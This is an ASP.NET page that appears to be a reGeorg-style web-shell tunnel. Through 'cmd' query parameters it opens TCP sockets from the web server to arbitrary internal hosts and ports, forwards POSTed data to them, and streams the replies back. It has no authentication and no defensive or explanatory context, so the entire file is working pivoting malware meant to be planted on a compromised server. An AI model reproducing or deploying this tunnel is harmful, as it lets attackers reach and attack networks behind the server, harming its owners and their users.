<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
    try
    {
        if (Request.HttpMethod == "POST")
        {
            //String cmd = Request.Headers.Get("X-CMD");
			String cmd = Request.QueryString.Get("cmd").ToUpper();
            if (cmd == "CONNECT")
            {
                try
                {
                    String target = Request.QueryString.Get("target").ToUpper();//Request.Headers.Get("X-TARGET");
                    int port = int.Parse(Request.QueryString.Get("port"));//Request.Headers.Get("X-PORT"));
                    IPAddress ip = IPAddress.Parse(target);
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    //sender.Blocking = false;
                    //sender.ReceiveTimeout = 1;
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Session.Add("socket", sender);
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "DISCONNECT")
            {
                try {
                    Socket s = (Socket)Session["socket"];
                    s.Close();
                } catch (Exception ex){

                }
                Session.Abandon();
                Response.AddHeader("X-STATUS", "OK");
            }
            else if (cmd == "FORWARD")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                    {
                        s.Send(buff);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "READ")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int c = 0;
                    byte[] readBuff = new byte[512];
                    try
                    {
                        while ((c = s.Receive(readBuff)) > 0)
                        {
                            byte[] newBuff = new byte[c];
                            Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                            Response.BinaryWrite(newBuff);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }                    
                    catch (SocketException soex)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }

                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
        }
    }
    catch (Exception exKak)
    {
		//Response.AddHeader(exKak.Message);
        Response.AddHeader("X-ERROR", exKak.Message);
        Response.AddHeader("X-ERROR", "FAIL");
    }
%>